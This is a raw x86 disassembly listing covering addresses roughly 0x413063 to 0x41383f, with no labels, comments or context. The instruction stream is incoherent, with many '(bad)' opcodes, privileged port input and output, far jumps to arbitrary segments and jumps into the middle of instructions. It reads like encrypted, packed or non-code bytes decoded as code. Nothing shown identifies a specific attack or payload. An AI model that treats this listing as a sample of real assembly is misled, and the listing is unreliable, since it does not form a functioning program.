  413063:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413064:	jne    0x4130d0
  413066:	jl     0x413049
  413068:	hlt    
  413069:	cmp    DWORD PTR [ebp-0x74a9ffdf],eax
  41306f:	pop    ds
  413070:	inc    ecx
  413071:	jne    0x413029
  413073:	mov    dl,0xea
  413075:	in     eax,dx
  413076:	and    eax,0xc9d04989
  41307b:	jbe    0x413074
  41307d:	imul   ebp,edx,0x36871aaf
  413083:	mov    dl,0xa4
  413085:	fisub  WORD PTR [edi]
  413087:	repz leave 
  413089:	and    DWORD PTR [esp+ecx*2-0x57a714d6],eax
  413090:	mov    esi,0x78c8ded0
  413095:	inc    esp
  413096:	cdq    
  413097:	icebp  
  413098:	jg     0x4130ec
  41309a:	int3   
  41309b:	mov    ch,0x5b
  41309d:	dec    esp
  41309e:	sub    eax,DWORD PTR [edi+0x6c]
  4130a1:	xchg   esp,eax
  4130a2:	out    0x69,eax
  4130a4:	adc    al,0x30
  4130a6:	xchg   esp,eax
  4130a7:	ins    DWORD PTR es:[edi],dx
  4130a8:	dec    eax
  4130a9:	jne    0x4130ae
  4130ab:	push   ebp
  4130ac:	add    ebp,DWORD PTR [esi]
  4130ae:	out    dx,al
  4130af:	popf   
  4130b0:	lea    edx,[bx+si-0x5ab2]
  4130b5:	and    ebp,DWORD PTR [eax-0x167042b4]
  4130bb:	mov    al,0x88
  4130bd:	sub    ebx,DWORD PTR [ebx+0x41b98ede]
  4130c3:	mov    edi,0x7bdb53f6
  4130c8:	xchg   BYTE PTR [ecx+0x4cdbca34],bh
  4130ce:	mov    ebx,0x2b60d262
  4130d3:	into   
  4130d4:	stos   BYTE PTR es:[edi],al
  4130d5:	xlat   BYTE PTR ds:[ebx]
  4130d6:	hlt    
  4130d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4130d8:	repz jo 0x41310a
  4130db:	enter  0x6f41,0x4e
  4130df:	push   ebp
  4130e0:	(bad)  
  4130e1:	fdiv   st(6),st
  4130e3:	inc    ebx
  4130e4:	sub    esi,DWORD PTR [ecx-0x1d]
  4130e7:	lods   al,BYTE PTR ds:[esi]
  4130e8:	sub    DWORD PTR ds:0x44b477ec,ebx
  4130ee:	xor    eax,0x19128417
  4130f3:	popf   
  4130f4:	dec    esi
  4130f5:	aas    
  4130f6:	inc    edi
  4130f7:	ins    DWORD PTR es:[edi],dx
  4130f8:	jmp    0x4130e9
  4130fa:	call   0x75d91320
  4130ff:	add    ebx,DWORD PTR [edx-0x6f]
  413102:	popf   
  413103:	and    edx,DWORD PTR [edx-0x67d8c3e5]
  413109:	mov    ebp,0xdee4c37e
  41310e:	pop    ss
  41310f:	pushf  
  413110:	lds    edi,FWORD PTR [eax+0x39]
  413113:	mov    bl,0x9e
  413115:	pop    esp
  413116:	pushf  
  413117:	adc    dl,BYTE PTR [esi+0x3a]
  41311a:	ins    BYTE PTR es:[edi],dx
  41311b:	les    edx,FWORD PTR [eax+0x45]
  41311e:	pop    edi
  41311f:	xor    BYTE PTR [eax],ah
  413121:	js     0x4130fa
  413123:	jne    0x4130c9
  413125:	inc    edi
  413126:	out    dx,eax
  413127:	push   ebp
  413128:	inc    ebx
  413129:	xchg   BYTE PTR [edx],al
  41312b:	call   0x73b8:0x5c11d657
  413132:	lahf   
  413133:	call   eax
  413135:	outs   dx,BYTE PTR ds:[esi]
  413136:	(bad)  
  413137:	lds    ebx,FWORD PTR [esi]
  413139:	test   BYTE PTR [ebp-0xf0d1c49],bl
  41313f:	popa   
  413140:	sbb    DWORD PTR [eax+0x12],edx
  413143:	(bad)  
  413144:	jmp    0x4131b4
  413146:	in     eax,dx
  413147:	add    eax,0xa078faf9
  41314c:	mov    es,WORD PTR [eax+0x50]
  41314f:	jmp    0x122f28ea
  413154:	pop    eax
  413155:	repz imul esi,DWORD PTR [esp+edx*8-0x30ab21de],0xffffff99
  41315e:	das    
  41315f:	xchg   DWORD PTR [ebx+0x18],esi
  413162:	ins    DWORD PTR es:[edi],dx
  413163:	mov    bh,0xf9
  413165:	jae    0x4131d8
  413167:	(bad)  
  413168:	in     eax,0xb1
  41316a:	icebp  
  41316b:	cmp    ah,BYTE PTR [eax-0x433cf11e]
  413171:	dec    edi
  413172:	cmp    al,BYTE PTR [edi+0x5722cb3]
  413178:	arpl   WORD PTR [edx-0xc974295],sp
  41317e:	in     eax,0xe6
  413180:	pop    ebx
  413181:	shl    DWORD PTR [esi+0x10],1
  413184:	push   eax
  413185:	in     al,dx
  413186:	push   ss
  413187:	cmp    BYTE PTR [edx-0x48],0xb3
  41318b:	push   cs
  41318c:	cld    
  41318d:	mov    dh,BYTE PTR [edx+0xd72e775]
  413193:	shr    ebx,cl
  413195:	add    al,0x89
  413197:	retf   0xbce7
  41319a:	mov    esi,0x3cc5531a
  41319f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131a0:	mov    esp,0x7fe6cf4c
  4131a5:	ins    DWORD PTR es:[edi],dx
  4131a6:	inc    ebp
  4131a7:	std    
  4131a8:	not    DWORD PTR [ecx-0x58]
  4131ab:	push   ds
  4131ac:	popf   
  4131ad:	pop    esp
  4131ae:	and    eax,0xfb627e1
  4131b3:	sbb    al,0x1d
  4131b5:	cmove  ecx,DWORD PTR [esi]
  4131b8:	dec    eax
  4131b9:	pop    ss
  4131ba:	jne    0x413239
  4131bc:	call   0x1863aa01
  4131c1:	mov    bh,0x9e
  4131c3:	cdq    
  4131c4:	xor    al,0x47
  4131c6:	repz push es
  4131c8:	and    al,0xc8
  4131ca:	xor    eax,DWORD PTR [eax+0x79]
  4131cd:	mov    BYTE PTR [esi-0x7903b933],ah
  4131d3:	cwde   
  4131d4:	cmp    al,0x7c
  4131d6:	das    
  4131d7:	sbb    al,0xb4
  4131d9:	rcr    BYTE PTR [esi-0x74],0xe
  4131dd:	(bad)  
  4131de:	(bad)  
  4131df:	out    dx,al
  4131e0:	jmp    DWORD PTR [ecx-0x740a97]
  4131e6:	add    al,0x1c
  4131e8:	sub    DWORD PTR [edx+0x20],edi
  4131eb:	outs   dx,BYTE PTR ds:[esi]
  4131ec:	fnstenv [ebx+0x1cf2598e]
  4131f2:	mov    ebx,0xa9f17658
  4131f7:	mov    bl,0x40
  4131f9:	lds    eax,FWORD PTR [edx-0x38]
  4131fc:	push   eax
  4131fd:	sbb    BYTE PTR [eax+0x38],0x8d
  413201:	fwait
  413202:	xchg   edi,eax
  413203:	dec    ebp
  413204:	imul   ecx,eax,0x401f4655
  41320a:	pop    ds
  41320b:	mov    eax,ds:0xd267d596
  413210:	into   
  413211:	stos   DWORD PTR es:[edi],eax
  413212:	in     eax,dx
  413213:	ins    BYTE PTR es:[edi],dx
  413214:	pop    esp
  413215:	adc    BYTE PTR [ecx+0x3],bh
  413218:	ds jp  0x41319e
  41321b:	cmp    bh,ch
  41321d:	aas    
  41321e:	pop    edx
  41321f:	ret    0x8323
  413222:	mov    bl,0x99
  413224:	je     0x41326b
  413226:	xchg   esi,eax
  413227:	xchg   ecx,eax
  413228:	dec    ecx
  413229:	push   cs
  41322a:	push   0xb0d5c936
  41322f:	icebp  
  413230:	mov    es,WORD PTR [ebx-0x17]
  413233:	pop    ds
  413234:	cs push 0x57
  413237:	lea    edx,ds:0x50fc1a20
  41323d:	inc    ebx
  41323e:	retf   
  41323f:	enter  0x71ab,0xfd
  413243:	out    dx,al
  413244:	aaa    
  413245:	cdq    
  413246:	sub    esi,DWORD PTR [eax+0xe]
  413249:	gs push ds
  41324b:	test   eax,0x2c28d5d9
  413250:	(bad)  
  413251:	and    ebp,esp
  413253:	pop    ecx
  413254:	dec    ecx
  413255:	test   ah,bl
  413257:	fistp  DWORD PTR [eax-0x165c14bd]
  41325d:	jmp    0x658d1a04
  413262:	rol    DWORD PTR [ebp+0x5d4498fd],cl
  413268:	dec    esi
  413269:	cld    
  41326a:	aam    0xa6
  41326c:	jo     0x41324b
  41326e:	fadd   DWORD PTR es:[eax]
  413271:	test   BYTE PTR [ebx-0x43],0xba
  413275:	sbb    BYTE PTR [edx],cl
  413277:	jp     0x4132de
  413279:	or     esp,0xea5e9ce6
  41327f:	dec    ebp
  413280:	ins    BYTE PTR es:[edi],dx
  413281:	sub    dh,BYTE PTR [esi]
  413283:	repz sar BYTE PTR [ebp+0x25],0xdb
  413288:	jbe    0x4132b6
  41328a:	pop    es
  41328b:	jl     0x41325e
  41328d:	lds    ecx,FWORD PTR [esi+0x23998b71]
  413293:	(bad)  
  413294:	push   edx
  413295:	addr16 int 0x35
  413298:	unpckhps xmm6,xmm4
  41329b:	sbb    eax,0x6423bef7
  4132a0:	cmp    edx,esp
  4132a2:	sbb    DWORD PTR [esi+0x4d],esi
  4132a5:	mov    WORD PTR [ebp+ebp*2-0x11],?
  4132a9:	jp     0x41327f
  4132ab:	sti    
  4132ac:	mov    esp,0xb1f94225
  4132b1:	das    
  4132b2:	xchg   ebx,eax
  4132b3:	cmp    al,bl
  4132b5:	test   eax,0x7c4ed766
  4132ba:	outs   dx,BYTE PTR ds:[esi]
  4132bb:	mov    eax,DWORD PTR [ecx+esi*1]
  4132be:	jo     0x4132b9
  4132c0:	test   DWORD PTR [edi],esi
  4132c2:	leave  
  4132c3:	das    
  4132c4:	mov    edx,DWORD PTR [ebp-0x53]
  4132c7:	je     0x4132af
  4132c9:	jecxz  0x41328c
  4132cb:	cmp    BYTE PTR [edi],ah
  4132cd:	nop
  4132ce:	out    0xc6,eax
  4132d0:	mov    DWORD PTR [eax+0x30403be2],edi
  4132d6:	push   eax
  4132d7:	call   0x67cc8fe0
  4132dc:	jo     0x4132cb
  4132de:	xlat   BYTE PTR ds:[ebx]
  4132df:	jge    0x4132c6
  4132e1:	mov    eax,ds:0x36a57364
  4132e6:	int    0x37
  4132e8:	dec    edx
  4132e9:	push   esi
  4132ea:	mov    eax,DWORD PTR [edx+0x36]
  4132ed:	push   0xc56d339c
  4132f2:	sub    al,0xaf
  4132f4:	or     esi,DWORD PTR [ebp-0x69e3a10b]
  4132fa:	sbb    al,0xe3
  4132fc:	sbb    bl,BYTE PTR [ebx+0x4420df9a]
  413302:	bound  esp,QWORD PTR [ebx-0x63]
  413305:	mov    ebp,DWORD PTR [edi]
  413307:	inc    eax
  413308:	xchg   ecx,eax
  413309:	lods   eax,DWORD PTR ds:[esi]
  41330a:	jle    0x41333c
  41330c:	push   ds
  41330d:	retf   0x944b
  413310:	mov    ebp,0x6b93bd48
  413315:	mov    ah,0x8d
  413317:	aad    0xf5
  413319:	inc    edi
  41331a:	and    DWORD PTR [edi-0x76],ebx
  41331d:	mov    ds:0xd9aac9ad,al
  413322:	xor    eax,0xd87691e8
  413327:	mov    ebx,DWORD PTR [esp+edi*2-0x77]
  41332b:	mov    ebp,0x2755be06
  413330:	ror    BYTE PTR [ecx-0x3484b180],1
  413336:	sbb    BYTE PTR [edi],cl
  413338:	test   ecx,ecx
  41333a:	push   0xfffffff8
  41333c:	push   ebx
  41333d:	cmp    al,0xba
  41333f:	(bad)  
  413340:	cmc    
  413341:	jmp    0x850a:0xb40fdd39
  413348:	in     eax,0x0
  41334a:	jnp    0x41334f
  41334c:	mov    ebp,0xc0d0bd54
  413351:	jecxz  0x4132e9
  413353:	jecxz  0x4133d1
  413355:	outs   dx,BYTE PTR ds:[esi]
  413356:	mov    esi,DWORD PTR [eax+edx*8+0x54c3dad3]
  41335d:	xchg   edi,eax
  41335e:	adc    ecx,DWORD PTR [eax-0x345eb45e]
  413364:	stc    
  413365:	dec    ebx
  413366:	pop    ebp
  413367:	mov    WORD PTR [eax+0xcaf5565],gs
  41336d:	jo     0x413392
  41336f:	mov    ?,WORD PTR [ecx+0x349e2fff]
  413375:	cwde   
  413376:	sbb    al,ch
  413378:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413379:	jl     0x41334d
  41337b:	pop    eax
  41337c:	cmc    
  41337d:	push   edx
  41337e:	pop    es
  41337f:	adc    eax,0xd40acf1c
  413384:	and    al,0x3b
  413386:	push   0xffffff8a
  413388:	(bad)  
  413389:	in     eax,dx
  41338a:	pushf  
  41338b:	push   0xffffffae
  41338d:	jmp    0xce06:0xff45e77b
  413394:	pop    esp
  413395:	mov    DWORD PTR [esi-0x4],esp
  413398:	inc    ebp
  413399:	mov    eax,0xeaddbb46
  41339e:	or     al,0x62
  4133a0:	ret    
  4133a1:	dec    esi
  4133a2:	inc    edi
  4133a3:	mov    dh,0xe8
  4133a5:	ins    BYTE PTR es:[edi],dx
  4133a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4133a7:	aas    
  4133a8:	(bad)  
  4133a9:	push   ebp
  4133aa:	sar    ebx,0xf0
  4133ad:	scas   al,BYTE PTR es:[edi]
  4133ae:	sbb    eax,0xbc4834ae
  4133b3:	sahf   
  4133b4:	popf   
  4133b5:	cmp    DWORD PTR [ecx+ebp*2-0x2c],ecx
  4133b9:	scas   al,BYTE PTR es:[edi]
  4133ba:	xor    eax,0x7332ed7a
  4133bf:	pushf  
  4133c0:	inc    edi
  4133c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4133c2:	and    ebx,DWORD PTR [eax+0xb]
  4133c5:	or     dh,bl
  4133c7:	clc    
  4133c8:	xchg   BYTE PTR [edx+0x7b],dh
  4133cb:	mov    al,ds:0xd89e21a0
  4133d0:	mov    eax,0x4c6b37ad
  4133d5:	mov    ecx,0xb40694e5
  4133da:	std    
  4133db:	jmp    0xcefc4601
  4133e0:	pop    eax
  4133e1:	xchg   ecx,eax
  4133e2:	or     al,0x93
  4133e4:	hlt    
  4133e5:	and    DWORD PTR [esi],edi
  4133e7:	sub    al,BYTE PTR [edi-0x5bfaaf6b]
  4133ed:	adc    BYTE PTR [edx],dh
  4133ef:	and    cl,BYTE PTR [ecx-0x3313052]
  4133f5:	sub    eax,0x404fd6ab
  4133fa:	(bad)  
  4133fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133fc:	loope  0x413398
  4133fe:	xchg   ebp,eax
  4133ff:	mul    DWORD PTR [ebp-0x5c4bfb6]
  413405:	hlt    
  413406:	cld    
  413407:	mov    bl,0x4d
  413409:	aad    0x9d
  41340b:	or     eax,0xc90fa54b
  413410:	mov    dh,0x3e
  413412:	test   al,0x26
  413414:	sbb    DWORD PTR [edi+0x10],ecx
  413417:	xchg   esi,eax
  413418:	xor    eax,0x5dfd663b
  41341d:	sbb    ebx,DWORD PTR ds:0xcdd365de
  413423:	fwait
  413424:	or     al,0xd
  413426:	or     al,BYTE PTR [ebp-0x2d306232]
  41342c:	dec    ecx
  41342d:	push   ebp
  41342e:	int3   
  41342f:	cmp    eax,0xef296322
  413434:	mov    edi,0x172134e
  413439:	enter  0xde9a,0xcc
  41343d:	ret    0x4d96
  413440:	xchg   ecx,eax
  413441:	repz leave 
  413443:	ret    0xba19
  413446:	sub    al,0xad
  413448:	jno    0x4133e3
  41344a:	mov    bh,0x1
  41344c:	mov    ds:0xb4931b02,eax
  413451:	popf   
  413452:	sbb    eax,DWORD PTR ds:0x683ffdc9
  413458:	push   cs
  413459:	popf   
  41345a:	stos   BYTE PTR es:[edi],al
  41345b:	mov    ecx,0x34cedf07
  413460:	pop    esp
  413461:	xor    al,0xa
  413463:	bswap  edi
  413465:	in     eax,dx
  413466:	out    0xde,eax
  413468:	xor    DWORD PTR [edi+0x3997700d],esi
  41346e:	inc    esp
  41346f:	std    
  413470:	mov    eax,0xacc510a8
  413475:	or     al,0x30
  413477:	and    al,0x5e
  413479:	in     al,dx
  41347a:	adc    DWORD PTR [edx+ecx*8-0x54],esp
  41347e:	mov    ebx,0xf9477b0e
  413483:	inc    esp
  413484:	pop    edx
  413485:	or     DWORD PTR [edi],eax
  413487:	out    0x48,eax
  413489:	mov    cl,0xbb
  41348b:	add    DWORD PTR [esi-0x1c],ecx
  41348e:	xlat   BYTE PTR ds:[ebx]
  41348f:	sbb    al,0x15
  413491:	mov    eax,ds:0xf7b3991f
  413496:	es xor BYTE PTR es:[ebx-0x13babd8a],0x1f
  41349f:	dec    DWORD PTR [edx+0x187ebee3]
  4134a5:	add    DWORD PTR [ebp-0x39],edx
  4134a8:	mov    ds:0x52e91c03,al
  4134ad:	dec    edx
  4134ae:	or     al,0x1d
  4134b0:	xchg   BYTE PTR [ebx-0x67],dh
  4134b3:	xor    edx,ebp
  4134b5:	adc    esp,esp
  4134b7:	sub    BYTE PTR [edi+0x72432de5],dl
  4134bd:	mov    ecx,0x65325268
  4134c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4134c3:	and    bh,BYTE PTR [edi+0x64]
  4134c6:	cmp    DWORD PTR [edx-0xd],edx
  4134c9:	out    dx,eax
  4134ca:	pop    ebx
  4134cb:	sbb    DWORD PTR [edi-0x1991977f],eax
  4134d1:	pop    edi
  4134d2:	lahf   
  4134d3:	mov    cs,WORD PTR [ebp+0x19]
  4134d6:	int    0xde
  4134d8:	push   edx
  4134d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4134da:	ins    BYTE PTR es:[edi],dx
  4134db:	sub    al,0x8e
  4134dd:	popf   
  4134de:	mov    eax,0x59b4346b
  4134e3:	aaa    
  4134e4:	cmp    DWORD PTR [eax-0x683ba1ce],esp
  4134ea:	add    esp,DWORD PTR [esi-0x49]
  4134ed:	out    dx,al
  4134ee:	icebp  
  4134ef:	push   cs
  4134f0:	in     al,0x6
  4134f2:	inc    edi
  4134f3:	jno    0x413535
  4134f5:	adc    eax,0x2d284d75
  4134fa:	inc    eax
  4134fb:	push   0x3b44743a
  413500:	aam    0xdb
  413502:	js     0x4134e4
  413504:	sbb    cl,al
  413506:	iret   
  413507:	mov    eax,ds:0x79c0cfbc
  41350c:	out    dx,eax
  41350d:	add    al,0x9a
  41350f:	sbb    al,0xb2
  413511:	mov    ebp,ebx
  413513:	jbe    0x413590
  413515:	jmp    0x41349d
  413517:	xor    BYTE PTR [eax],bh
  413519:	outs   dx,DWORD PTR ds:[esi]
  41351a:	mov    ebx,0xa8d6c633
  41351f:	ret    0x6570
  413522:	xchg   esp,eax
  413523:	test   eax,0x63851436
  413528:	mov    al,0x28
  41352a:	inc    esi
  41352b:	pop    eax
  41352c:	xchg   ecx,eax
  41352d:	xchg   al,al
  41352f:	mul    DWORD PTR [esi]
  413531:	sbb    edi,DWORD PTR [edx]
  413533:	xor    eax,0x66b52629
  413538:	or     eax,0x5abd69f5
  41353d:	dec    esi
  41353e:	test   DWORD PTR [ecx*4-0x138f7363],0x97232583
  413549:	nop
  41354a:	pop    ecx
  41354b:	mov    ah,0xa4
  41354d:	xchg   ecx,eax
  41354e:	jno    0x413583
  413550:	mov    dh,0x8f
  413552:	call   0x7b38:0xd7b99da6
  413559:	mov    ds:0x6f88a367,al
  41355e:	dec    edx
  41355f:	push   edi
  413560:	lds    esi,FWORD PTR [edi-0x3a4e6b24]
  413566:	jb     0x4135d0
  413568:	sub    al,0x9c
  41356a:	cld    
  41356b:	stos   BYTE PTR es:[edi],al
  41356c:	(bad)  
  41356d:	adc    eax,ebx
  41356f:	ret    0x37bc
  413572:	rol    DWORD PTR [edi],cl
  413574:	inc    edx
  413575:	cwde   
  413576:	add    ecx,ebx
  413578:	jo     0x413502
  41357a:	out    dx,eax
  41357b:	pop    esi
  41357c:	scas   eax,DWORD PTR es:[edi]
  41357d:	or     ch,bh
  41357f:	mov    ebp,0x358f2d1f
  413584:	ins    DWORD PTR es:[edi],dx
  413585:	pop    esi
  413586:	test   BYTE PTR [ebp-0x7],ah
  413589:	push   ss
  41358a:	jecxz  0x413528
  41358c:	jmp    0x222a:0xa5f8b92c
  413593:	pop    ebp
  413594:	outs   dx,BYTE PTR ds:[esi]
  413595:	mov    edi,0x4ee33338
  41359a:	inc    ebx
  41359b:	jns    0x413596
  41359d:	inc    ebx
  41359e:	je     0x4135bf
  4135a0:	adc    esi,DWORD PTR [edx]
  4135a2:	mov    esi,0xb5500787
  4135a7:	add    DWORD PTR [ebp-0x29cd1c75],ebx
  4135ad:	push   ss
  4135ae:	in     eax,0x4e
  4135b0:	or     BYTE PTR [eax-0x3],bl
  4135b3:	jae    0x4135c1
  4135b5:	jbe    0x4135b8
  4135b7:	pop    edi
  4135b8:	mov    DWORD PTR [eax+esi*2-0x602b22b7],ebx
  4135bf:	retf   
  4135c0:	das    
  4135c1:	mov    edx,0xccc99fa4
  4135c6:	test   esi,edi
  4135c8:	mov    cl,0x15
  4135ca:	in     eax,dx
  4135cb:	test   al,0x10
  4135cd:	outs   dx,BYTE PTR ds:[esi]
  4135ce:	fcomp  DWORD PTR [eax]
  4135d0:	ss jmp 0xd36c72ee
  4135d6:	mov    DWORD PTR [edx+0x36],eax
  4135d9:	cmp    al,0xaf
  4135db:	fisttp QWORD PTR [ebp-0x37]
  4135de:	adc    eax,0x3e0e9041
  4135e3:	mov    al,0xc5
  4135e5:	push   cs
  4135e6:	test   DWORD PTR [eax],0xd0c2607e
  4135ec:	xchg   edi,eax
  4135ed:	mov    bh,0x45
  4135ef:	(bad)  
  4135f0:	(bad)
  4135f3:	pusha  
  4135f4:	test   BYTE PTR [edx],al
  4135f6:	sub    ch,0x18
  4135f9:	(bad)  
  4135fa:	xlat   BYTE PTR ds:[ebx]
  4135fb:	popa   
  4135fc:	int3   
  4135fd:	pop    ss
  4135fe:	pop    ds
  4135ff:	adc    esi,DWORD PTR [esi+0x14be8637]
  413605:	mov    WORD PTR [edi-0x69],fs
  413608:	lock jmp 0x413620
  41360b:	fwait
  41360c:	push   ecx
  41360d:	dec    esi
  41360e:	sub    al,0x4f
  413610:	(bad)  
  413611:	repz jb 0x4135ce
  413614:	dec    ecx
  413615:	jb     0x41365a
  413617:	cwde   
  413618:	std    
  413619:	adc    bh,BYTE PTR [ecx]
  41361b:	jmp    0xd870:0xfefa3e9
  413622:	hlt    
  413623:	sub    eax,edi
  413625:	jb     0x413643
  413627:	jmp    0xbcfc:0x126aed71
  41362e:	fsubr  DWORD PTR ds:0x7993b268
  413634:	inc    ecx
  413635:	ins    DWORD PTR es:[edi],dx
  413636:	fadd   DWORD PTR [ecx+ecx*1+0x6babd25b]
  41363d:	scas   eax,DWORD PTR es:[edi]
  41363e:	push   esi
  41363f:	pop    ecx
  413640:	les    esp,FWORD PTR [esi-0x433d0533]
  413646:	lods   al,BYTE PTR ds:[esi]
  413647:	sbb    BYTE PTR [ecx-0x17],ch
  41364a:	or     al,0x40
  41364c:	add    edi,DWORD PTR ds:0xbaaed6c
  413652:	mov    ebx,0x4ab84f51
  413657:	sub    BYTE PTR [edi-0x63b787ff],bl
  41365d:	inc    edi
  41365e:	aaa    
  41365f:	and    BYTE PTR [edi],dl
  413661:	lods   eax,DWORD PTR ds:[esi]
  413662:	pop    eax
  413663:	jle    0x413609
  413665:	aas    
  413666:	repz push eax
  413668:	add    DWORD PTR [ecx+0x4c15c58f],esp
  41366e:	or     BYTE PTR [ecx-0x3b92d8ad],al
  413674:	xchg   BYTE PTR [eax-0x16],al
  413677:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413678:	pop    esi
  413679:	pop    esp
  41367a:	out    0x9,eax
  41367c:	push   0xffffffed
  41367e:	pop    edi
  41367f:	jle    0x4136fa
  413681:	push   ss
  413682:	pop    ebx
  413683:	cmp    al,0x92
  413685:	jne    0x413634
  413687:	add    ah,BYTE PTR [ebx]
  413689:	retf   
  41368a:	outs   dx,DWORD PTR ds:[esi]
  41368b:	inc    esi
  41368c:	fistp  WORD PTR [ebx-0x6bb2aff]
  413692:	sub    BYTE PTR [edi-0x27],cl
  413695:	mov    BYTE PTR gs:[esi+0x443ee816],dl
  41369c:	dec    BYTE PTR [ebx+edx*1-0x1c]
  4136a0:	pop    ds
  4136a1:	mov    bh,0x9c
  4136a3:	mov    WORD PTR [eax-0x54],cs
  4136a6:	dec    DWORD PTR [eax+0x2cd3ad1c]
  4136ac:	jo     0x413699
  4136ae:	iret   
  4136af:	ds push eax
  4136b1:	sub    bh,BYTE PTR [ebp+0x6ad2d971]
  4136b7:	jns    0x413714
  4136b9:	push   0x970c5ffe
  4136be:	(bad)  
  4136bf:	test   eax,0x8baa1333
  4136c4:	sahf   
  4136c5:	bound  esi,QWORD PTR [edi]
  4136c7:	or     edi,ebx
  4136c9:	push   es
  4136ca:	push   edi
  4136cb:	ins    DWORD PTR es:[edi],dx
  4136cc:	jecxz  0x41366d
  4136ce:	mov    dh,0x43
  4136d0:	frndint 
  4136d2:	dec    ebx
  4136d3:	mov    ebp,edx
  4136d5:	push   ebp
  4136d6:	xchg   esi,eax
  4136d7:	pop    ecx
  4136d8:	sti    
  4136d9:	xor    DWORD PTR [edi+0x45],esp
  4136dc:	(bad)  
  4136de:	lds    ebx,FWORD PTR [ebx]
  4136e0:	xor    dh,ah
  4136e2:	adc    BYTE PTR [ebp+ebx*2+0x7f0c86d8],dh
  4136e9:	sahf   
  4136ea:	scas   eax,DWORD PTR es:[edi]
  4136eb:	or     BYTE PTR [ecx-0x1e01e6ce],bh
  4136f1:	mov    DWORD PTR [edx-0x72],ebx
  4136f4:	nop
  4136f5:	aas    
  4136f6:	pop    DWORD PTR [edi+ecx*8-0x301fa1d9]
  4136fd:	mov    eax,ds:0x90adc9a6
  413702:	out    dx,al
  413703:	mov    ds:0xf94c65ff,al
  413708:	pop    ebx
  413709:	lods   eax,DWORD PTR ds:[esi]
  41370a:	sahf   
  41370b:	ret    
  41370c:	test   BYTE PTR [eax],ch
  41370e:	sbb    al,ch
  413710:	aas    
  413711:	sub    al,0x4a
  413713:	mov    edi,0x6565f56c
  413718:	pusha  
  413719:	push   eax
  41371a:	ret    0x2702
  41371d:	inc    edi
  41371e:	and    ecx,edx
  413720:	jbe    0x413704
  413722:	mov    dh,0x55
  413724:	ja     0x4137a0
  413726:	push   ecx
  413727:	push   esp
  413728:	inc    ecx
  413729:	mov    ds:0x98d42404,eax
  41372e:	int    0xe2
  413730:	pop    edi
  413731:	add    sp,WORD PTR [edx]
  413734:	mov    ebp,0x42064951
  413739:	adc    eax,0xfa23ca66
  41373e:	int    0x82
  413740:	shr    esi,0xab
  413743:	out    dx,eax
  413744:	inc    edi
  413745:	push   eax
  413746:	mov    ax,ds:0x719d92
  41374c:	push   ss
  41374d:	les    esi,FWORD PTR [esi]
  41374f:	fimul  DWORD PTR [ebx+edx*4-0x5850de12]
  413756:	xor    al,0xb9
  413758:	sbb    bl,BYTE PTR [ebx+0x78]
  41375b:	ds dec ecx
  41375d:	imul   esp,edx,0x8accad11
  413763:	retf   
  413764:	add    dl,BYTE PTR [ecx-0x2604999c]
  41376a:	retf   0xe460
  41376d:	pop    ds
  41376e:	cmp    eax,0xb49621c3
  413773:	pop    esi
  413774:	out    0x8e,eax
  413776:	enter  0xd263,0x1a
  41377a:	jp     0x4137b7
  41377c:	hlt    
  41377d:	and    BYTE PTR [eax-0x56502a50],ch
  413783:	mov    BYTE PTR [ebx+eiz*8],ah
  413786:	dec    esi
  413787:	push   edi
  413788:	ror    ebp,0xe0
  41378b:	jmp    0x94d9:0x5a932995
  413792:	mov    ebp,ds
  413794:	push   0x42
  413796:	shl    BYTE PTR [esi+0x262f9426],cl
  41379c:	sbb    ebp,DWORD PTR [esi+0x7e]
  41379f:	mov    al,0xae
  4137a1:	pop    ecx
  4137a2:	out    0x29,al
  4137a4:	in     eax,dx
  4137a5:	gs pop edi
  4137a7:	sbb    DWORD PTR [edi],ecx
  4137a9:	sub    BYTE PTR [edx+ebx*2],ah
  4137ac:	loopne 0x413758
  4137ae:	push   esi
  4137af:	cmp    BYTE PTR [esp+edx*4+0x76a2d484],bh
  4137b6:	outs   dx,DWORD PTR ds:[esi]
  4137b7:	inc    eax
  4137b8:	mov    edx,0xf6c3db66
  4137bd:	cmp    ch,BYTE PTR [ebp+0x596678e1]
  4137c3:	jnp    0x4137be
  4137c5:	dec    esi
  4137c6:	imul   ebp,DWORD PTR [edi+0x3f8cc50f],0xfffffffe
  4137cd:	mov    eax,0xbfa16481
  4137d2:	ret    
  4137d3:	mov    BYTE PTR ds:0x91331f7b,bl
  4137d9:	mov    ebx,0x77fd30a5
  4137de:	mov    dh,0xbe
  4137e0:	aad    0x2c
  4137e2:	or     al,0xa7
  4137e4:	(bad)  
  4137e5:	out    0xf5,al
  4137e7:	sti    
  4137e8:	jecxz  0x413817
  4137ea:	push   es
  4137eb:	or     DWORD PTR [edi],ecx
  4137ed:	loop   0x4137c4
  4137ef:	mov    al,ds:0x2a49f758
  4137f4:	std    
  4137f5:	(bad)  
  4137f6:	repnz mov edi,0x513b0405
  4137fc:	sti    
  4137fd:	xchg   ebp,eax
  4137fe:	jne    0x413780
  413800:	sbb    DWORD PTR [edi+eax*4],ecx
  413803:	lds    ebx,FWORD PTR [ebx]
  413805:	retf   
  413806:	ret    
  413807:	pop    ebx
  413808:	leave  
  413809:	mov    dl,0x75
  41380b:	out    0x68,eax
  41380d:	shl    BYTE PTR [esi],cl
  41380f:	inc    eax
  413810:	or     al,0xd
  413812:	hlt    
  413813:	stos   DWORD PTR es:[edi],eax
  413814:	icebp  
  413815:	test   al,0xf5
  413817:	push   DWORD PTR [edx+esi*2]
  41381a:	inc    eax
  41381b:	mov    esp,0xe5bca9f9
  413820:	test   eax,0x11905b42
  413825:	scas   eax,DWORD PTR es:[edi]
  413826:	scas   eax,DWORD PTR es:[edi]
  413827:	adc    eax,0xdf382521
  41382c:	inc    ebx
  41382d:	xchg   BYTE PTR [edx-0x38],dl
  413830:	int    0x7d
  413832:	loop   0x41387d
  413834:	(bad)  [ebp-0x5931c670]
  41383a:	push   cs
  41383b:	loopne 0x4137bd
  41383d:	lea    edi,[esi]
  41383f:	xor    eax,0xa9a945ea
